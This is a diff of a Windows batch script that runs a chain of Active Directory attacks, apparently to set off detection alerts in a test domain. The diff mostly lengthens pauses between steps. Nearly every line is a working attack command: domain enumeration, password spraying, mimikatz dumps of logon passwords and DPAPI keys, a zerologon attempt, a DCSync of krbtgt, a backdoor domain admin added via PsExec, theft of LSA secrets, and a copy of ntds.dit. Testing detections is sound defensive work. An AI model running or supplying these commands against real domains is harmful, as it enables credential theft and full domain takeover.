@@ -23,9 +23,11 @@ powershell.exe .\DisableNotifications.ps1
 
 rem **Network-mapping reconnaissance (DNS) (PUT YOUR DOMAIN CONTROLLER AND DOMAIN NAME HERE)
 (Echo server DC1.corp.contoso.com & Echo ls -d corp.contoso.com)|NSLOOKUP
+TIMEOUT /T 120
 
 rem **User and IP Address reconnaissance (PUT YOUR DC NAME HERE)
 NetSess.exe DC1.corp.contoso.com
+TIMEOUT /T 120
 
 rem **Directory Service Enumeration
 net user /domain 
@@ -33,10 +35,11 @@ net group /domain
 net group "Domain Admins" /domain 
 net group "Enterprise Admins" /domain 
 net group "Schema Admins" /domain 
+TIMEOUT /T 120
 
 rem **Security principal reconnaissance (LDAP)
 oradad.exe
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Enumerate accounts with Kerberos DES enabled
 powershell.exe "([adsisearcher]'(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=2097152))').FindAll() | Out-File -FilePath .\accounts.txt"
@@ -51,10 +54,11 @@ rem **Enumerate all servers configured for Unconstrained Delegation (Excluding D
 powershell.exe "([adsisearcher]'(&(objectCategory=computer)(!(primaryGroupID=516))(userAccountControl:1.2.840.113556.1.4.803:=524288))').FindAll() | Out-File -FilePath .\accounts.txt -Append"
 
 powershell.exe "Get-Content -Path .\accounts.txt"
+TIMEOUT /T 120
 
 rem **Account enumerations Reconnaissance. (PUT YOUR DOMAIN HERE)
 powershell.exe -Command " & {Import-Module .\adlogin.ps1; adlogin users.txt corp.contoso.com P@ssw0rd!}"
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Suspected AS-REP Roasting attack (PUT YOUR DOMAIN CONTROLLER HERE)
 Rubeus.exe kerberoast
@@ -66,40 +70,43 @@ TIMEOUT /T 3
 
 rem **Suspected Brute-Force Attack (Kerberos, NTLM and LDAP) & Password Spray attack (PUT YOUR DOMAIN HERE)
 wmic useraccount get name >domainusers.txt
-TIMEOUT /T 3
-powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt corp.contoso.com P@ssw0rd!}"
-TIMEOUT /T 3
+TIMEOUT /T 10
+powershell.exe -Command " & { Import-Module .\adlogin.ps1; adlogin domainusers.txt corp.contoso.com P@ssw0rd}"
+TIMEOUT /T 120
 
 rem **Dump Credentials In-Memory
 certutil.exe -decode mimikatz.txt mimikatz.exe
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >victimcpc.txt
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Malicious request of Data Protection API (DPAPI) master key (PUT YOUR DC HERE)
 mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:DC1.corp.contoso.com /export"  "exit"
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Suspected Netlogon privilege elevation attempt (PUT YOUR DC AND DOMAIN HERE)
 mimikatz.exe "privilege::debug" "lsadump::zerologon /target:DC1.corp.contoso.com /account:admin$"  "exit"
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Suspected DCSync attack (replication of directory services) (PUT YOUR DOMAIN HERE)
 mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.contoso.com /user:krbtgt" "exit"
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Domain dominance (PUT YOUR DOMAIN CONTROLLER HERE)
 wmic /node:DC1.corp.contoso.com process call create "net user /add BadGuy pa$$w0rd1"
 PsExec.exe \\DC1.corp.contoso.com -accepteula net localgroup "Administrators" BadGuy /add
-TIMEOUT /T 3
+TIMEOUT /T 120
 
 rem **Dump Secrets (PUT YOUR DOMAIN CONTROLLER HERE)
 PsExec.exe -accepteula -s -d \\dc1.corp.contoso.com reg save HKLM\security\policy\secrets %temp%\secrets
+TIMEOUT /T 120
 
 rem **Remote code execution attempts (PUT YOUR DOMAIN CONTROLLER HERE)
 PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd.exe
+TIMEOUT /T 120
 
 rem **Data exfiltration over SMB (PUT YOUR DOMAIN CONTROLLER HERE)
 PSExec.exe -accepteula -s -d \\dc1.corp.contoso.com cmd /c esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
+TIMEOUT /T 120
 
 rem ** Cleanup ** (PUT YOUR DOMAIN CONTROLLER HERE)
 wmic /node:"DC1.corp.contoso.com" process call create "net user /delete BadGuy"
